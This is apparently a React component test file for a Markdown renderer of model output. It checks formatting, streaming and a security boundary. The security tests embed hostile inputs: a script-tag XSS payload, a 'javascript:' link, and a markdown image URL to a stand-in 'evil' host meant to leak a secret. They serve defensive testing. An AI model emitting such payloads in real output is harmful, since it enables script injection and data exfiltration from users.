import { describe, expect, it } from 'vitest';
import { render } from '@testing-library/react';
import { Markdown } from './index';

// Component (DOM) tests for the shared renderer (34-rich-text-rendering §10). Assert real semantic
// elements (not literal `**`), and that hostile model strings produce NO live element / href / image.

describe('Markdown — renders semantic elements', () => {
  it('renders bold + a list as <strong> and <li>, not literal markdown', () => {
    const { container, queryByText } = render(
      <Markdown>{'You are **steady**.\n\n- one\n- two'}</Markdown>,
    );
    expect(container.querySelector('strong')?.textContent).toBe('steady');
    expect(container.querySelectorAll('li')).toHaveLength(2);
    // No raw asterisks survive as text.
    expect(queryByText(/\*\*/)).toBeNull();
  });

  it('renders headings as <h3>/<h4>, blockquote, and hr', () => {
    const { container } = render(<Markdown>{'# Title\n\n> a quote\n\n---\n\n#### Sub'}</Markdown>);
    expect(container.querySelector('h3')?.textContent).toBe('Title');
    expect(container.querySelector('h4')?.textContent).toBe('Sub');
    expect(container.querySelector('blockquote')?.textContent).toContain('a quote');
    expect(container.querySelector('hr')).not.toBeNull();
  });

  it('inline mode renders emphasis but no block elements', () => {
    const { container } = render(<Markdown inline>{'a **fact** with `code`'}</Markdown>);
    expect(container.querySelector('strong')?.textContent).toBe('fact');
    expect(container.querySelector('code')?.textContent).toBe('code');
    expect(container.querySelector('p')).toBeNull();
    expect(container.querySelector('ul')).toBeNull();
  });

  it('renders empty / whitespace input as nothing', () => {
    const { container } = render(<Markdown>{'   '}</Markdown>);
    expect(container.firstChild).toBeNull();
  });
});

describe('Markdown — security boundary', () => {
  it('never produces a live <script> from model output', () => {
    const { container } = render(<Markdown>{'before <script>alert(1)</script> after'}</Markdown>);
    expect(container.querySelector('script')).toBeNull();
    // The angle-bracket text survives as literal text inside a paragraph.
    expect(container.textContent).toContain('<script>alert(1)</script>');
  });

  it('never produces an <img> (no network fetch from a model string)', () => {
    const { container } = render(
      <Markdown>{'look ![x](http://evil/track.png?leak=secret) here'}</Markdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
  });

  it('renders a link as styled, non-navigating text with no href', () => {
    const { container } = render(<Markdown>{'see [the site](javascript:alert(1)) now'}</Markdown>);
    expect(container.querySelector('a')).toBeNull();
    expect(container.querySelector('[href]')).toBeNull();
    expect(container.textContent).toContain('the site');
  });
});

describe('Markdown — streaming degradation', () => {
  it('renders an incomplete bold run literally, then resolves when closed', () => {
    const { container, rerender } = render(<Markdown>{'You are **stay'}</Markdown>);
    expect(container.querySelector('strong')).toBeNull();
    expect(container.textContent).toContain('**stay');
    rerender(<Markdown>{'You are **stayed** now'}</Markdown>);
    expect(container.querySelector('strong')?.textContent).toBe('stayed');
    expect(container.textContent).not.toContain('**');
  });
});
